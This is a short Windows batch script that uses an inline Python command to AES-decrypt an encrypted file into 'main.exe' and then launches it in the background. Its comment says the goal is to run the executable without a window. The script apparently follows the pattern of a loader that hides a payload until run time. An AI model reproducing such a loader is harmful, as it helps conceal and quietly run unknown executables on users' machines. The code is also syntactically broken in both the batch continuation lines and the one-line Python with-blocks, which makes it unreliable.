@echo off
rem Decrypt the executable
python -c "from Crypto.Cipher import AES; \
import os; \
with open('key.bin', 'rb') as f: key = f.read(); \
cipher = AES.new(key, AES.MODE_ECB); \
with open('cipher.bin', 'rb') as f: \
    ciphertext = f.read(); \
plaintext = cipher.decrypt(ciphertext); \
with open('main.exe', 'wb') as f: f.write(plaintext);"

rem Run the decrypted executable without a window
start /B main.exe
